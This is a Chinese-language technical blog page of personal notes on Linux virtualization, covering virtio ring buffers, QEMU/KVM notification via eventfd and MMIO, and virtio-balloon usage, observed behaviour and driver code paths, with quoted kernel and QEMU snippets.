<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vring_create_virtqueue</span><br><span class="line">vring_create_virtqueue_split</span><br><span class="line">vring_alloc_queue_split</span><br><span class="line">	-&gt; vring_split-&gt;vring.desc = vring_alloc_queue(num)</span><br></pre></td></tr></table></figure>

<p>前者是avai ring qemu把新请求的desc id放在里面  然后更新这个avai ring的index</p>
<p>qemu会维护这个avai ring的last index 然后avai_ring[last_index]读到desc id desc[desc_id]读到真正的信息的共享内存地址 然后再读数据 </p>
<p>同理 use ring表示另一侧</p>
<p>实现中 desc avail used用的是一块连续的物理内存</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vstatic <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">vring_init</span><span class="params">(<span class="keyword">struct</span> vring *vr, <span class="type">unsigned</span> <span class="type">int</span> num, <span class="type">void</span> *p,</span></span><br><span class="line"><span class="params">			      <span class="type">unsigned</span> <span class="type">long</span> align)</span></span><br><span class="line">&#123;</span><br><span class="line">	vr-&gt;num = num;</span><br><span class="line">	vr-&gt;desc = p;</span><br><span class="line">	vr-&gt;avail = (<span class="keyword">struct</span> vring_avail *)((<span class="type">char</span> *)p + num * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> vring_desc));</span><br><span class="line">	vr-&gt;used = (<span class="type">void</span> *)(((<span class="type">uintptr_t</span>)&amp;vr-&gt;avail-&gt;ring[num] + <span class="keyword">sizeof</span>(__virtio16)</span><br><span class="line">		+ align<span class="number">-1</span>) &amp; ~(align - <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="guest"><a href="#guest" class="headerlink" title="guest"></a>guest</h3><p>scatterlist是内核数据结构 只是记录了page地址 并没有读数据</p>
<p><code>sg-&gt;page_link = (unsigned long)page</code></p>
<p>调用vring_map_one_sg-&gt;sg_phys拿到gpa记录在desc中</p>
<p>sg-&gt;length就是buflen 即pfn个数乘长度(4字节 最多256个 共1024字节)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">desc[i].addr = vring_map_one_sg(sg)</span><br><span class="line">desc[i].len = sg-&gt;length</span><br><span class="line"></span><br><span class="line">vring.avail-&gt;ring[avail] = i</span><br><span class="line">vring.avail-&gt;idx++</span><br></pre></td></tr></table></figure>

<p>这里把地址展开 其实就是sg-&gt;page_link 也就是page的地址 GPA</p>
<p>所以这里sg用的buf 必须也是提前制定好的共享内存 相当于绕了一圈回来了 最终还是一块固定的共享内存</p>
<p>并且sg本身存了个地址 然后又拿了地址 跟sg没什么关系 qemu这边也并不会访问到sg 只是为了复用一些函数？</p>
<p>是virtio_balloon结构体中的pfns数组</p>
<p>每次balloon guest把pfn写在这块固定的共享内存上(pfns) 然后把这个地址写到一个sg中 再把这个地址写到desc中 再把desc索引写到avail中 qemu从avail拿到desc索引 再拿pfns地址  传来传去就是一个固定的地址 </p>
<h3 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h3><p>从avail拿到desc索引</p>
<p>从desc拿到GPA 转成HVA</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">i = vring_avail_ring(last_avail_idx++)</span><br><span class="line">vring_split_desc_read(&amp;desc,i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">virtqueue_map_desc(desc.addr,desc.len)&#123;</span><br><span class="line">	iov[0].iov_base = dma_memory_map(desc.addr)</span><br><span class="line">	iov[0].iov_len = desc.len</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里dma_memory_map-&gt;address_space_map把GPA转为HVA 但是代码实现看起来非常复杂</p>
<blockquote>
<p>Map a physical memory region into a host virtual address</p>
</blockquote>
<p>用HVA copy guest的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">elem = virtqueue_pop(vq,sizeof(VirtQueueElement));</span><br><span class="line">while(iov_to_buf(elem-&gt;out_sg,elem-&gt;out_num,offset,&amp;pfn,4)==4)</span><br><span class="line"></span><br><span class="line">if(offset &lt;= iov[0].iov_len)</span><br><span class="line">	memcpy(buf,iov[0].iov_base + offset,bytes)</span><br></pre></td></tr></table></figure>

<h3 id="used"><a href="#used" class="headerlink" title="used"></a>used</h3><h2 id="通知机制"><a href="#通知机制" class="headerlink" title="通知机制"></a>通知机制</h2><h3 id="glib"><a href="#glib" class="headerlink" title="glib"></a>glib</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73494896/article/details/127011228">详细介绍Glib 主事件循环轻度分析与编程应用_g_main_loop_run_极致Linux内核的博客-CSDN博客</a></p>
<p>事件循环</p>
<p>例如connect拿到fd  glib会包装poll 响应时dispatch调用callback</p>
<h3 id="eventfd"><a href="#eventfd" class="headerlink" title="eventfd"></a>eventfd</h3><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/40572954">让事件飞 ——Linux eventfd 原理与实践 - 知乎 (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/393748176">Linux fd 系列 — eventfd 是什么？ - 知乎 (zhihu.com)</a></p>
<p>一个eventfd维护一个8bit的整型 write对应累加 read对应清零</p>
<p>当值是0时read会阻塞</p>
<p>producer用write 1 consumer用read实现阻塞</p>
<h3 id="mmio"><a href="#mmio" class="headerlink" title="mmio"></a>mmio</h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/9Zv7XcsvlVwDDjTn85-SZQ">Linux虚拟化KVM-Qemu分析（十二）之ioeventfd与irqfd (qq.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/huang987246510/article/details/105618557">qemu中的eventfd——ioeventfd_享乐主的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1518217">virtIO前后端notify机制详解-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<ol>
<li>mmio的地址不能提交给kvm然后让guest访问 应该qemu来模拟，这里模拟的写操作会到<code>virtio_pci_config_write</code>处理</li>
<li>为了提高效率 mmio的地址与eventfd绑定，kvm不需要回到qemu 而是直接通过eventfd通知qemu</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps virtio_pci_config_ops = &#123;</span><br><span class="line">    .read = virtio_pci_config_read,</span><br><span class="line">    .write = virtio_pci_config_write,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_pci_bus_class_init</span><span class="params">(ObjectClass *klass, <span class="type">void</span> *data)</span>&#123;</span><br><span class="line">	k-&gt;set_guest_notifiers = virtio_pci_set_guest_notifiers;</span><br><span class="line">    	-&gt;virtio_pci_set_guest_notifier</span><br><span class="line">            -&gt;event_notifier_init	</span><br><span class="line">            	-&gt;eventfd</span><br><span class="line">	k-&gt;device_plugged = virtio_pci_device_plugged;</span><br><span class="line">    	-&gt;memory_region_init_io(&amp;proxy-&gt;bar, OBJECT(proxy),&amp;virtio_pci_config_ops,</span><br><span class="line">			proxy, <span class="string">&quot;virtio-pci&quot;</span>, size);</span><br><span class="line">    k-&gt;ioeventfd_assign = virtio_pci_ioeventfd_assign;</span><br><span class="line">    	-&gt;memory_region_add_eventfd-&gt;memory_region_transaction_commit-&gt;address_space_update_ioeventfds-&gt;address_space_add_del_ioeventfds-&gt;MEMORY_LISTEMER_CALL(eventfd_add)</span><br><span class="line">            -&gt;kvm_set_ioeventfd_mmio</span><br><span class="line">            	-&gt;kvm_vm_ioctl(kvm_state, KVM_IOEVENTFD, &amp;iofd);</span><br><span class="line">&#125;</span><br><span class="line">kvm</span><br><span class="line">kvm_assign_ioeventfd_idx</span><br></pre></td></tr></table></figure>

<p>qemu端 virt queue 注册handle_output<code>typedef void (*VirtIOHandleOutput)(VirtIODevice *, VirtQueue *);</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">memory_region_dispatch_write</span><br><span class="line">memory_region_write_accessor</span><br><span class="line">virtio_pci_config_write</span><br><span class="line">virtio_ioport_write&#123;</span><br><span class="line">	<span class="keyword">case</span> VIRTIO_PCI_QUEUE_NOTIFY:</span><br><span class="line">        virtio_queue_notify(vdev, val);</span><br><span class="line">        	-&gt;<span class="keyword">if</span>(vq-&gt;host_notifier_enabled)</span><br><span class="line">                event_notifier_set(&amp;vq-&gt;host_notifier);</span><br><span class="line">    		<span class="keyword">else</span>	vq-&gt;handle_output(vdev,vq)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>guest </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">virtqueue_kick</span><br><span class="line">virtqueue_notify</span><br><span class="line"><span class="type">bool</span> <span class="title function_">vp_notify</span><span class="params">(<span class="keyword">struct</span> virtqueue *vq)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* we write the queue&#x27;s selector into the notification register to</span></span><br><span class="line"><span class="comment">	 * signal the other end */</span></span><br><span class="line">	iowrite16(vq-&gt;index, vp_dev-&gt;ldev.ioaddr + VIRTIO_PCI_QUEUE_NOTIFY);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>kvm</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">handle_ept_misconfig</span><span class="params">(<span class="keyword">struct</span> kvm_vcpu *vcpu)</span>&#123;</span><br><span class="line">    gpa = vmcs_read64(GUEST_PHYSICAL_ADDRESS);</span><br><span class="line">	<span class="keyword">if</span> (!is_guest_mode(vcpu) &amp;&amp;</span><br><span class="line">	    !kvm_io_bus_write(vcpu, KVM_FAST_MMIO_BUS, gpa, <span class="number">0</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        	-&gt;ioeventfd_write</span><br><span class="line">                -&gt;eventfd_signal (counter增加 唤醒)</span><br><span class="line">        <span class="comment">//正常执行返回0 提前退出</span></span><br><span class="line">		<span class="keyword">return</span> kvm_skip_emulated_instruction(vcpu);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里返回0 会让kvm进入下一次vcpu_run的循环 不会退出ioctl到qemu</p>
<p>qemu在哪里等待这个eventfd  被唤醒后如何处理 网上没有相关的介绍</p>
<blockquote>
<p>host通知guest当然是通过注入中断的方式，首先调用的是virtio_notify，继而调用virtio_notify_vector并把中断向量作为参数传递进去。这里就调用了设备关联的notify函数，具体实现为virtio_pci_notify函数，常规中断（非MSI）会调用qemu_set_irq，在8259a中断控制器的情况下回调用kvm_pic_set_irq，然后到了kvm_set_irq，这里就会通过kvm_vm_ioctl和KVM交互，接口为KVM_IRQ_LINE，通知KVM对guest进行中断的注入。KVm里的kvm_vm_ioctl函数会对此调用进行处理，具体就是调用kvm_vm_ioctl_irq_line，之后就调用kvm_set_irq函数进行注入了。之后的流程参看中断虚拟化部分。</p>
</blockquote>
<p>hw&#x2F;virtio&#x2F;virtio-pci.c</p>
<p>virio_ioport_write</p>
<p>virtio_pci_config_ops</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42681961/article/details/82827911">qemu-kvm 对mmio的模拟_qemu mmio-CSDN博客</a></p>
<p>guest:</p>
<p>drivers&#x2F;virtio&#x2F;virtio_pci_legacy.c</p>
<p>vq-&gt;priv &#x3D; … VIRTIO_PCI_QUEUE_NOTIFY</p>
<p>qemu:</p>
<p>memory_region_add_eventfd(VIRTIO_PCI_QUEUE_NOTIFY)</p>
<p><a href="read://https_blog.csdn.net/?url=https%3A%2F%2Fblog.csdn.net%2Fqq_41596356%2Farticle%2Fdetails%2F128441953">virtio前端驱动通知机制分析 (csdn.net)</a></p>
<p>这里说</p>
<blockquote>
<p><code>iowrite VIRTIO_PCI_QUEUE_NOTIFY</code> 后会产生一个 <code>vm-exit</code>，<code>KVM</code> 会判断 <code>exit_reason</code>， <code>I/O</code> 操作对应的执行函数是 <code>virtio_ioport_write()</code> 。</p>
</blockquote>
<p>kvm使用的eventfd来自do_eventfd  在fs&#x2F;eventfd.c</p>
<p>qemu在哪里用？</p>
<p><a target="_blank" rel="noopener" href="https://tinylab.org/qemu-vhost/">Qemu vhost 原理分析 - 泰晓科技 (tinylab.org)</a> 3.1节 有完整的调用路径 但是是需要kvm退回到qemu的 </p>
<p>guest中balloon直接循环virtqueue_notify</p>
<p>qemu中accel&#x2F;kvm&#x2F;kvm-all.c kvm_cpu_exec加代码统计 是mmio</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kvm_cpu_exec</span><br><span class="line">	-&gt;address_space_rw</span><br><span class="line">		-&gt;address_space_write</span><br><span class="line">			-&gt;memory_region_dispatch_write</span><br></pre></td></tr></table></figure>



<p>kvm</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">npf_interception</span><br><span class="line">	-&gt;kvm_mmu_page_fault</span><br><span class="line">    	-&gt;x86_emulate_instruction</span><br><span class="line">            -&gt;x86_emulate_insn</span><br><span class="line">                -&gt;writeback</span><br><span class="line">                    -&gt;segmented_write</span><br><span class="line">                        -&gt;emulator_write_emulated</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/01/22/virtualization/balloon/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/01/22/virtualization/balloon/" class="post-title-link" itemprop="url">balloon</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2024-01-22 20:57:11" itemprop="dateCreated datePublished" datetime="2024-01-22T20:57:11+08:00">2024-01-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/virtualization/" itemprop="url" rel="index"><span itemprop="name">virtualization</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>14k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>51 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="balloon"><a href="#balloon" class="headerlink" title="balloon"></a>balloon</h1><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ul>
<li>guest使用的内核在编译时需要把config_virtio_balloon的选项打开，可以y直接编译进内核 也可以m作为模块手动加载</li>
<li>qemu启动时加入virtio-balloon选项</li>
</ul>
<p>进入虚拟机后ctrl a c进入qemu monitor</p>
<ul>
<li>info balloon查看当前balloon大小，默认为qemu启动时指定的最大内存</li>
<li>balloon xxx(mb) 调整大小</li>
</ul>
<p>显示的balloon大小为VM真实可用的内存，剩下的给host</p>
<ul>
<li>如果不加入deflate-on-oom参数，VMfree -mh显示内存为balloon大小 超过此大小触发oom killer</li>
<li>如果加入此参数，VM free -mh显示启动指定的最大参数，但是used显示分给host的值 超过balloon大小会自动调大balloon</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.linux-kvm.org/page/Projects/auto-ballooning#TODO">Projects&#x2F;auto-ballooning - KVM (linux-kvm.org)</a></p>
<p>auto balloon似乎被废弃了</p>
<p><a target="_blank" rel="noopener" href="https://www.ovirt.org/develop/projects/mom.html">MoM | oVirt</a>这个工具可能可用</p>
<p>qmp:</p>
<ul>
<li>balloon  value</li>
<li>query-balloon</li>
</ul>
<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><p>host guest1 guest2均为4G内存</p>
<ol>
<li>guest1要2G 从内存分配</li>
<li>guest2要2G swap掉guest1</li>
<li>guest1要2G swap掉guest2</li>
</ol>
<p><strong>1 正常情况  guest2要内存 host内存不够 回收 但是guest1的2G被swap</strong> 从htop中guest1的qemu 进程mem占用情况可以看出来</p>
<p>ctrl a c 输入info balloon &#x2F;balloon xxx (MB)</p>
<p>balloon后面的数字代表VM真实可用内存(不参与balloon) 这个值不能超过qemu启动分配的内存</p>
<p>balloon目前找不到合适的自动化监控，需要手动用qemu调</p>
<p><strong>2 guest2需要很多内存的时候手动进guest1的qemu monitor 调小balloon 然后reclaim会直接回收而不是swap</strong></p>
<p>balloon只会回收guest内存 不会回收host上被swap的guest的页</p>
<p><a target="_blank" rel="noopener" href="https://zhidao.baidu.com/question/1519495184466483140.html">KVM之四：内存balloon的奇妙_百度知道 (baidu.com)</a></p>
<blockquote>
<p>目前没有比较方便的、自动化的机制来管理ballooning，一般都是采用在QEMU monitor中执行balloon命令来实现ballooning的。没有对VM的有效监控，没有自动化的ballooning机制，这可能会让生产环境中实现大规模自动化部署并不很方便。</p>
</blockquote>
<p><strong>3 如果memhog后sleep 持续占用内存 那balloon会直接把这个进程kill掉 强行拿掉VM的内存</strong></p>
<p>所以用balloon和不用在结果上是有很大区别的。不用balloon host会把VM的所有内存都swap掉 不管free与否；用balloon host会强行回收VM内存 如果不够就让VMkill自己的进程 </p>
<p><strong>4 如果VM配了 swap VM会swap</strong></p>
<blockquote>
<p>如果有大量内存从VM系统中回收，Ballooning可能会降低VM操作系统运行的性能。一方面，内存的减少，可能会让VM中作为磁盘数据缓存的内存被放到气球中，从而VM中的磁盘I&#x2F;O访问会增加；另一方面，如果处理机制不够好，也可能让VM中正在运行的进程由于内存不足而执行失败。</p>
</blockquote>
<p>[<a target="_blank" rel="noopener" href="https://listman.redhat.com/archives/libvir-list/2015-December/msg00494.html">libvirt] [PATCH 2&#x2F;2] qemu: add support of optional ‘deflate-on-oom’ attribute (redhat.com)</a></p>
<p>qemu中可以加入deflate-on-oom的选项，这时候配置了balloon并不会让VM的可用内存变小，而是在VM可用内存不变的情况下增加了Used，之后不会影响VM程序的正常使用。<strong>5 当VM需要的内存大于balloon配置之后，会自动进行deflate 向host要内存 此时info balloon可以看到balloon的值被自动调大了</strong>。但是被调大之后是不会再自动缩小的</p>
<p><strong>6 VM自己swap的优先级是比deflate-on-oom的优先级高的</strong></p>
<p><strong>7 在VMlogout的时候 balloon进行回收 仍然能回收到</strong></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/edver/p/14684138.html">virtio简介（二） —— virtio-balloon guest侧驱动 - Edver - 博客园 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="http://ssdxiao.github.io/linux/2017/03/20/Virtio-Balloon.html">Virtio-Balloon超详细分析 (ssdxiao.github.io)</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">virtio_driver</span> <span class="title">virtio_balloon_driver</span> =</span> &#123;</span><br><span class="line">	.feature_table = features,</span><br><span class="line">	.feature_table_size = ARRAY_SIZE(features),</span><br><span class="line">	.driver.name =	KBUILD_MODNAME,</span><br><span class="line">	.driver.owner =	THIS_MODULE,</span><br><span class="line">	.id_table =	id_table,</span><br><span class="line">	.validate =	virtballoon_validate,</span><br><span class="line">	.probe =	virtballoon_probe,</span><br><span class="line">	.remove =	virtballoon_remove,</span><br><span class="line">	.config_changed = virtballoon_changed,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PM_SLEEP</span></span><br><span class="line">	.freeze	=	virtballoon_freeze,</span><br><span class="line">	.restore =	virtballoon_restore,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>本身暴露的接口并不多 可以认为就<code>virtballoon_changed</code>一个</p>
<p>这个内核模块是前端</p>
<p>需要qemu添加<code>-device virtio-balloon-pci</code>在宿主机上创建一个balloon后端</p>
<p>qemu monitor中的balloon指令会向VM中的驱动发送指令，从而调用<code>virtballoon_changed</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __virtio_config_changed(<span class="keyword">struct</span> virtio_device *dev)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">virtio_driver</span> *<span class="title">drv</span> =</span> drv_to_virtio(dev-&gt;dev.driver);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!dev-&gt;config_enabled)</span><br><span class="line">		dev-&gt;config_change_pending = <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (drv &amp;&amp; drv-&gt;config_changed)</span><br><span class="line">		drv-&gt;config_changed(dev);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>update_balloon_size_func</code> 每次<code>virtballoon_changed</code>只会发生一次 但是调整大小的函数会触发很多次 不是一次性调整好的，并且<code>virtballoon_changed</code>是异步。如果每次update输出时间影响效率</p>
<p>内核启动时<code>vp_find_vqs_intx</code>注册<code>vp_interrupt</code> 之后向队列写入信息时会产生中断</p>
<p><code>vp_interrupt</code>-&gt;<code>vp_config_changed</code>-&gt;<code>virtio_config_changed</code>-&gt;<code>__virtio_config_changed</code></p>
<p>注册vp_interrupt的函数 追踪调用 发现是probe的init_vqs probe由virio_bus的probe调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">bind_store</span><span class="params">(<span class="keyword">struct</span> device_driver *drv, <span class="type">const</span> <span class="type">char</span> *buf,</span></span><br><span class="line"><span class="params">			  <span class="type">size_t</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bus_type</span> *<span class="title">bus</span> =</span> bus_get(drv-&gt;bus);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">	<span class="type">int</span> err = -ENODEV;</span><br><span class="line"></span><br><span class="line">	dev = bus_find_device_by_name(bus, <span class="literal">NULL</span>, buf);</span><br><span class="line">	<span class="keyword">if</span> (dev &amp;&amp; driver_match_device(drv, dev)) &#123;</span><br><span class="line">		err = device_driver_attach(drv, dev);</span><br><span class="line">		<span class="keyword">if</span> (!err) &#123;</span><br><span class="line">			<span class="comment">/* success */</span></span><br><span class="line">			err = count;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	put_device(dev);</span><br><span class="line">	bus_put(bus);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> device *<span class="title function_">bus_find_device</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> bus_type *bus,</span></span><br><span class="line"><span class="params">			       <span class="keyword">struct</span> device *start, <span class="type">const</span> <span class="type">void</span> *data,</span></span><br><span class="line"><span class="params">			       <span class="type">int</span> (*match)(<span class="keyword">struct</span> device *dev, <span class="type">const</span> <span class="type">void</span> *data))</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">subsys_private</span> *<span class="title">sp</span> =</span> bus_to_subsys(bus);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">klist_iter</span> <span class="title">i</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!sp)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	klist_iter_init_node(&amp;sp-&gt;klist_devices, &amp;i,</span><br><span class="line">			     (start ? &amp;start-&gt;p-&gt;knode_bus : <span class="literal">NULL</span>));</span><br><span class="line">	<span class="keyword">while</span> ((dev = next_device(&amp;i)))</span><br><span class="line">		<span class="keyword">if</span> (match(dev, data) &amp;&amp; get_device(dev))</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	klist_iter_exit(&amp;i);</span><br><span class="line">	subsys_put(sp);</span><br><span class="line">	<span class="keyword">return</span> dev;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">device_match_name</span><span class="params">(<span class="keyword">struct</span> device *dev, <span class="type">const</span> <span class="type">void</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> sysfs_streq(dev_name(dev), name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所有device维护在bus这个数据结构中</p>
<p><code>mdev_device_create</code> 创建device</p>
<p>对于qemu的info操作 似乎并不会触发内核的函数 如何通过一个接口看一下时间？</p>
<p>在update size函数中 如果无变化返回之前 加入print</p>
<p>即想查看的时候同样用修改的接口 输入一个不变的值即可</p>
<p>从结果来看比较准确且稳定</p>
